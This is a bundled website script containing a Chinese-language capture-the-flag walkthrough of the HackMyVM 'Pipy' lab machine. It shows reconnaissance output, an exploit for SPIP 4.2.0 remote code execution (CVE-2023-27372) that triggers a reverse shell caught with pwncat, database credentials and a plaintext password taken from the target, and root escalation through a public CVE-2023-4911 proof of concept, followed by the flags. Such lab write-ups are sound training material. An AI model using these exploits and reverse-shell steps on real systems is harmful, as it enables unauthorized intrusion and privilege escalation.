"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[871],{50462:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>l,contentTitle:()=>o,default:()=>d,frontMatter:()=>r,metadata:()=>a,toc:()=>c});const a=JSON.parse('{"id":"HackMyVM/Machines/Pipy/index","title":"Pipy","description":"[Linux VM] [Tested on VirtualBox] created by || ruycr4ft","source":"@site/docs/HackMyVM/Machines/Pipy/index.md","sourceDirName":"HackMyVM/Machines/Pipy","slug":"/HackMyVM/Machines/Pipy/","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Pipy/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Pipy/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackMyVM_Sidebar","previous":{"title":"Pickle","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Pickle/"},"next":{"title":"Pwned","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Pwned/"}}');var i=s(74848),t=s(28453);const r={},o="Pipy",l={},c=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"\u63a2\u6d4b web \u670d\u52a1",id:"\u63a2\u6d4b-web-\u670d\u52a1",level:2},{value:"\u5c1d\u8bd5\u63d0\u6743\u81f3\u6b63\u5e38\u7528\u6237",id:"\u5c1d\u8bd5\u63d0\u6743\u81f3\u6b63\u5e38\u7528\u6237",level:2},{value:"user pwned",id:"user-pwned",level:2},{value:"\u5c1d\u8bd5\u63d0\u6743\u5230 root",id:"\u5c1d\u8bd5\u63d0\u6743\u5230-root",level:2},{value:"root pwned",id:"root-pwned",level:2}];function p(n){const e={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",strong:"strong",...(0,t.R)(),...n.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(e.header,{children:(0,i.jsx)(e.h1,{id:"pipy",children:"Pipy"})}),"\n",(0,i.jsxs)(e.admonition,{type:"note",children:[(0,i.jsx)(e.p,{children:"[Linux VM] [Tested on VirtualBox] created by || ruycr4ft"}),(0,i.jsx)(e.p,{children:"\u23f2\ufe0f Release Date // 2023-10-18"}),(0,i.jsx)(e.p,{children:"\u2714\ufe0f MD5 // ed365ef516cedb5549dfcc84c84d3fd7"}),(0,i.jsx)(e.p,{children:"\u2620 Root // 68"}),(0,i.jsx)(e.p,{children:"\ud83d\udc80 User // 72"}),(0,i.jsxs)(e.p,{children:["\ud83d\udcddNotes //\nReally easy box to learn very recent privesc ",":D"]})]}),"\n",(0,i.jsx)(e.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,i.jsx)(e.p,{children:"\u9776\u673a IP:"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-plaintext",children:"192.168.56.120\n"})}),"\n",(0,i.jsx)(e.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-plaintext",children:"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   256 c0:f6:a1:6a:53:72:be:8d:c2:34:11:e7:e4:9c:94:75 (ECDSA)\n|_  256 32:1c:f5:df:16:c7:c1:99:2c:d6:26:93:5a:43:57:59 (ED25519)\n80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))\n|_http-server-header: Apache/2.4.52 (Ubuntu)\n|_http-title: Mi sitio SPIP\n|_http-generator: SPIP 4.2.0\nMAC Address: 08:00:27:6A:EE:5B (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,i.jsx)(e.h2,{id:"\u63a2\u6d4b-web-\u670d\u52a1",children:"\u63a2\u6d4b web \u670d\u52a1"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{alt:"access /",src:s(29109).A+"",width:"1471",height:"881"})}),"\n",(0,i.jsx)(e.p,{children:"\u6267\u884c\u76ee\u5f55\u63a2\u6d4b"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"[20:42:03] 200 -    7KB - /CHANGELOG.md\n[20:42:04] 200 -   34KB - /LICENSE\n[20:42:04] 200 -  842B  - /README.md\n[20:42:14] 200 -    2KB - /composer.json\n[20:42:14] 200 -   27KB - /composer.lock\n[20:42:14] 301 -  317B  - /config  ->  http://192.168.56.120/config/\n[20:42:15] 200 -    2KB - /config/\n[20:42:20] 200 -    4KB - /htaccess.txt\n[20:42:21] 200 -    7KB - /index.php\n[20:42:21] 200 -    7KB - /index.php/login/\n[20:42:22] 301 -  321B  - /javascript  ->  http://192.168.56.120/javascript/\n[20:42:23] 301 -  316B  - /local  ->  http://192.168.56.120/local/\n[20:42:23] 200 -    2KB - /local/\n[20:42:36] 200 -    3KB - /tmp/\n[20:42:37] 200 -    1KB - /tmp/sessions/\n[20:42:38] 200 -    0B  - /vendor/composer/autoload_psr4.php\n[20:42:38] 200 -    2KB - /vendor/\n[20:42:38] 200 -    0B  - /vendor/autoload.php\n[20:42:38] 200 -    0B  - /vendor/composer/autoload_classmap.php\n[20:42:38] 200 -    0B  - /vendor/composer/autoload_files.php\n[20:42:38] 200 -    0B  - /vendor/composer/autoload_real.php\n[20:42:38] 200 -    0B  - /vendor/composer/autoload_static.php\n[20:42:38] 200 -    0B  - /vendor/composer/autoload_namespaces.php\n[20:42:38] 200 -    0B  - /vendor/composer/ClassLoader.php\n[20:42:38] 200 -   15KB - /vendor/composer/installed.json\n[20:42:38] 200 -    1KB - /vendor/composer/LICENSE\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u6839\u636e\u76ee\u5f55\u626b\u63cf\u4ee5\u53ca README \u6587\u4ef6\u5185\u7684\u4fe1\u606f\uff0c\u53ef\u4ee5\u786e\u5b9a\u662f SPIP \u6846\u67b6"}),"\n",(0,i.jsx)(e.p,{children:"\u6839\u636e\u6d4f\u89c8\u5668\u63d2\u4ef6\u4ee5\u53ca\u670d\u52a1\u7aef\u6307\u7eb9\u7684\u8bc6\u522b\uff0c\u53ef\u4ee5\u786e\u5b9a\u4e3a SPIP 4.2.0"}),"\n",(0,i.jsxs)(e.p,{children:["\u6839\u636e\u76f8\u5173\u4fe1\u606f\uff0c\u5b9a\u4f4d\u5230\u8fd9\u4e2a exp",(0,i.jsx)(e.a,{href:"https://www.exploit-db.com/exploits/51536",children:"SPIP v4.2.0 - Remote Code Execution (Unauthenticated) - exploit-db"})]}),"\n",(0,i.jsx)(e.p,{children:"\u5c1d\u8bd5\u8fdb\u884c\u5229\u7528"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:'(env) \u250c\u2500[randark@parrot]\u2500[~/exps]\n\u2514\u2500\u2500\u257c $python3 CVE-2023-27372.py -u http://192.168.56.120/ -v -c "bash  reverse.sh"\n[+] Anti-CSRF token found : iYe2q77AjJpzr7DiCN466DffCNPeUp0xMFqKM8HZ2jA5IWNjp6Vhzoioj1CV4d/wM8wzPYKIJAYCiLEY+fBNfgPHcNshG3+b\n'})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $pwncat-cs -lp 9999\n[21:35:48] Welcome to pwncat \ud83d\udc08!                                                                                                                                                                                            __main__.py:164\n[21:35:52] received connection from 192.168.56.120:49260                                                                                                                                                                         bind.py:84\n[21:35:52] 192.168.56.120:49260: registered new host w/ db                                                                                                                                                                   manager.py:957\n(local) pwncat$ back\n(remote) www-data@pipy:/var/www/html$ whoami\nwww-data\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u83b7\u5f97\u521d\u6b65\u7acb\u8db3\u70b9"}),"\n",(0,i.jsx)(e.h2,{id:"\u5c1d\u8bd5\u63d0\u6743\u81f3\u6b63\u5e38\u7528\u6237",children:"\u5c1d\u8bd5\u63d0\u6743\u81f3\u6b63\u5e38\u7528\u6237"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-plaintext",metastring:'title="PEASS-ng"',children:"/run/mysqld/mysqld.sock\n  \u2514\u2500(Read Write)\n\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Users with console\nangela:x:1000:1000:Angela:/home/angela:/bin/bash\nroot:x:0:0:root:/root:/bin/bash\n\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Analyzing Github Files (limit 70)\ndrwxr-xr-x 3 www-data www-data 4096 Oct  3 15:36 /var/www/html/vendor/algo26-matthias/idna-convert/.github\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u68c0\u6d4b\u5230\u5b58\u5728 mysql \u6570\u636e\u5e93\uff0c\u5e76\u4e14\u68c0\u6d4b\u5230\u5386\u53f2\u64cd\u4f5c\u8bb0\u5f55"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",metastring:'title="/var/www/.bash_history"',children:"whoami\nexit\nexit\nreset xterm\nexport TERM=xterm-256color\nstty rows 51 cols 197\nls\nnano\nls\ncat config/connect.php\nmysql -u root -p\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5e76\u80fd\u8bfb\u53d6\u5230\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u6570\u636e\u5e93\u51ed\u636e"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",metastring:'title="/var/www/html/config/connect.php"',children:"<?php\nif (!defined(\"_ECRIRE_INC_VERSION\")) return;\ndefined('_MYSQL_SET_SQL_MODE') || define('_MYSQL_SET_SQL_MODE',true);\n$GLOBALS['spip_connect_version'] = 0.8;\nspip_connect_db('localhost','','root','dbpassword','spip','mysql','spip','','');\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5c1d\u8bd5\u8fde\u63a5\u6570\u636e\u5e93"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-sql",children:'MariaDB [mysql]> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| mysql              |\n| performance_schema |\n| spip               |\n| sys                |\n+--------------------+\n5 rows in set (0.000 sec)\n\nMariaDB [mysql]> use spip;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nMariaDB [spip]> show tables;\n+-------------------------+\n| Tables_in_spip          |\n+-------------------------+\n| spip_articles           |\n| spip_auteurs            |\n| spip_auteurs_liens      |\n| spip_depots             |\n| spip_depots_plugins     |\n| spip_documents          |\n| spip_documents_liens    |\n| spip_forum              |\n| spip_groupes_mots       |\n| spip_jobs               |\n| spip_jobs_liens         |\n| spip_meta               |\n| spip_mots               |\n| spip_mots_liens         |\n| spip_paquets            |\n| spip_plugins            |\n| spip_referers           |\n| spip_referers_articles  |\n| spip_resultats          |\n| spip_rubriques          |\n| spip_syndic             |\n| spip_syndic_articles    |\n| spip_types_documents    |\n| spip_urls               |\n| spip_versions           |\n| spip_versions_fragments |\n| spip_visites            |\n| spip_visites_articles   |\n+-------------------------+\n28 rows in set (0.000 sec)\n\nMariaDB [spip]> select * from spip_auteurs;\n+-----------+--------+-----+-----------------+----------+----------+--------+--------------------------------------------------------------+---------+-----------+-----------+---------------------+-----+--------+---------------------+-----------------------------------+----------------------------------+---------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------+--------+------+----------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\n| id_auteur | nom    | bio | email           | nom_site | url_site | login  | pass                                                         | low_sec | statut    | webmestre | maj                 | pgp | htpass | en_ligne            | alea_actuel                       | alea_futur                       | prefs                                                                                                               | cookie_oubli                                                                                                                                         | source | lang | imessage | backup_cles                                                                                                                                                                                                                                                                  |\n+-----------+--------+-----+-----------------+----------+----------+--------+--------------------------------------------------------------+---------+-----------+-----------+---------------------+-----+--------+---------------------+-----------------------------------+----------------------------------+---------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------+--------+------+----------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\n|         1 | Angela |     | angela@pipy.htb |          |          | angela | 4ng3l4                                                       |         | 0minirezo | oui       | 2023-10-04 17:28:39 |     |        | 2023-10-04 13:50:34 | 387046876651c39a45bc836.13502903  | 465278670651d6da4349d85.01841245 | a:4:{s:7:"couleur";i:2;s:7:"display";i:2;s:18:"display_navigation";s:22:"navigation_avec_icones";s:3:"cnx";s:0:"";} | NULL                                                                                                                                                 | spip   |      |          | 3HnqCYcjg+hKOjCODrOTwhvDGXqQ34zRxFmdchyPL7wVRW3zsPwE6+4q0GlAPo4b4OGRmzvR6NNFdEjARDtoeIAxH88cQZt2H3ENUggrz99vFfCmWHIdJgSDSOI3A3nmnfEg43BDP4q9co/AP0XIlGzGteMiSJwc0fCXOCxzCW9NwvzJYM/u/8cWGGdRALd7fzFYhOY6DmokVnIlwauc8/lwRyNbam1H6+g5ju57cI8Dzll+pCMUPhhti9RvC3WNzC2IUcPnHEM= |\n|         2 | admin  |     | admin@pipy.htb  |          |          | admin  | $2y$10$.GR/i2bwnVInUmzdzSi10u66AKUUWGGDBNnA7IuIeZBZVtFMqTsZ2 |         | 1comite   | non       | 2023-10-04 17:31:03 |     |        | 2023-10-04 17:31:03 | 1540227024651d7e881c21a5.84797952 | 439334464651da1526dbb90.67439545 | a:4:{s:7:"couleur";i:2;s:7:"display";i:2;s:18:"display_navigation";s:22:"navigation_avec_icones";s:3:"cnx";s:0:"";} | 1118839.6HqFdtVwUs3T6+AJRJOdnZG6GFPNzl4/wAh9i0D1bqfjYKMJSG63z4KPzonGgNUHz+NmYNLbcIM83Tilz5NYrlGKbw4/cDDBE1mXohDXwEDagYuW2kAUYeqd8y5XqDogNsLGEJIzn0o= | spip   | fr   | oui      |                                                                                                                                                                                                                                                                              |\n+-----------+--------+-----+-----------------+----------+----------+--------+--------------------------------------------------------------+---------+-----------+-----------+---------------------+-----+--------+---------------------+-----------------------------------+----------------------------------+---------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------+--------+------+----------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u5f97\u5230 Angela \u7684\u51ed\u636e\uff1a"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-plainyexy",children:"angela:4ng3l4\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u6210\u529f\u767b\u5f55 Angela \u7684\u8d26\u6237"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $pwncat-cs angela@192.168.56.120\n[21:59:30] Welcome to pwncat \ud83d\udc08!                                                                                                                                                                                            __main__.py:164\nPassword: ******\n[21:59:39] 192.168.56.120:22: registered new host w/ db                                                                                                                                                                      manager.py:957\n(local) pwncat$ back\n(remote) angela@pipy:/home/angela$ whoami\nangela\n"})}),"\n",(0,i.jsx)(e.h2,{id:"user-pwned",children:"user pwned"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"(remote) angela@pipy:/home/angela$ cat user.txt\ndab37650d43787424362d5805140538d\n"})}),"\n",(0,i.jsx)(e.h2,{id:"\u5c1d\u8bd5\u63d0\u6743\u5230-root",children:"\u5c1d\u8bd5\u63d0\u6743\u5230 root"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-plaintext",metastring:'title="find / -perm -u=s -type f 2>/dev/null"',children:"/usr/libexec/polkit-agent-helper-1\n/usr/lib/snapd/snap-confine\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/umount\n/usr/bin/mount\n/usr/bin/chfn\n/usr/bin/fusermount3\n/usr/bin/newgrp\n/usr/bin/chsh\n/usr/bin/sudo\n/usr/bin/su\n/usr/bin/pkexec\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u7ecf\u8fc7 ",(0,i.jsx)(e.strong,{children:"\u4f5c\u5f0a\uff08\u67e5\u770b\u522b\u4eba\u7684 Writeup\uff09"}),"\uff0c\u53ef\u4ee5\u5b9a\u4f4d\u5230\u8fd9\u4e2a\u6f0f\u6d1e\uff1aCVE-2023-4911 - ",(0,i.jsx)(e.a,{href:"https://github.com/leesh3288/CVE-2023-4911#poc-of-cve-2023-4911-looney-tunables",children:'PoC of CVE-2023-4911 "Looney Tunables"'})]}),"\n",(0,i.jsx)(e.p,{children:"\u5c1d\u8bd5\u5229\u7528"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"(remote) angela@pipy:/home/angela/CVE-2023-4911$ ls -lh\ntotal 16K\n-rw-r--r-- 1 angela angela 3.8K Feb  1 14:23 exp.c\n-rw-r--r-- 1 angela angela  390 Feb  1 14:23 gen_libc.py\n-rw-r--r-- 1 angela angela  179 Feb  1 14:23 Makefile\n-rw-r--r-- 1 angela angela  717 Feb  1 14:23 README.md\n(remote) angela@pipy:/home/angela/CVE-2023-4911$ make\ngcc -o exp exp.c\npython3 gen_libc.py\n[*] Checking for new versions of pwntools\n    To disable this functionality, set the contents of /home/angela/.cache/.pwntools-cache-3.10/update to 'never' (old way).\n    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):\n        [update]\n        interval=never\n[!] An issue occurred while checking PyPI\n[*] You have the latest version of Pwntools (4.11.0)\n[*] '/lib/x86_64-linux-gnu/libc.so.6'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n./exp\ntry 100\ntry 200\n# whoami\nroot\n"})}),"\n",(0,i.jsx)(e.h2,{id:"root-pwned",children:"root pwned"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-shell",children:"# cat root.txt\nab55ed08716cd894e8097a87dafed016\n"})})]})}function d(n={}){const{wrapper:e}={...(0,t.R)(),...n.components};return e?(0,i.jsx)(e,{...n,children:(0,i.jsx)(p,{...n})}):p(n)}},29109:(n,e,s)=>{s.d(e,{A:()=>a});const a=s.p+"assets/images/image_20240220-212057-40bfbecdf3fff2caffd45c5675a860e4.png"},28453:(n,e,s)=>{s.d(e,{R:()=>r,x:()=>o});var a=s(96540);const i={},t=a.createContext(i);function r(n){const e=a.useContext(t);return a.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function o(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(i):n.components||i:r(n.components),a.createElement(t.Provider,{value:e},n.children)}}}]);